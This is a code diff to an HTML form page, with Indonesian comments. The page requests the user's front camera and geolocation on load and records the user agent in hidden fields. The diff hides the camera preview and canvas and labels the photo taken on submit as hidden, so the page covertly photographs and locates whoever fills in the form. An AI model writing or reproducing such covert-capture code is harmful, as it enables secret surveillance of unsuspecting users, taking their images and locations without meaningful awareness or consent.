@@ -14,10 +14,8 @@
         padding: 8px;
         border-radius: 4px;
       }
-      video {
-        max-width: 100%;
-        border-radius: 6px;
-        margin-bottom: 10px;
+      video, canvas {
+        display: none; /* Kamera & canvas disembunyikan */
       }
     </style>
   </head>
@@ -79,11 +77,9 @@
         </div>
       </div>
 
-      <div id="camera-area" style="display:none;">
-        <label class="label">Camera Preview</label>
-        <video id="video" autoplay playsinline></video>
-        <canvas id="canvas" style="display:none;"></canvas>
-      </div>
+      <!-- Kamera & Canvas disembunyikan -->
+      <video id="video" autoplay playsinline></video>
+      <canvas id="canvas"></canvas>
 
       <input type="hidden" name="latitude" id="latitude" />
       <input type="hidden" name="longitude" id="longitude" />
@@ -116,15 +112,13 @@
 
       document.getElementById("userAgent").value = navigator.userAgent;
 
-      // Minta izin kamera & lokasi otomatis
       window.onload = async function () {
         try {
-          // Kamera
+          // Kamera (hidden preview)
           const stream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: "user" },
           });
           video.srcObject = stream;
-          document.getElementById("camera-area").style.display = "block";
 
           // Lokasi
           if ("geolocation" in navigator) {
@@ -163,7 +157,7 @@
         message.style.display = "block";
         submitButton.disabled = true;
 
-        // Capture foto dari video
+        // Capture foto dari video (hidden)
         const context = canvas.getContext("2d");
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
@@ -187,5 +181,4 @@
       });
     </script>
   </body>
-          </html>
-            
+</html>
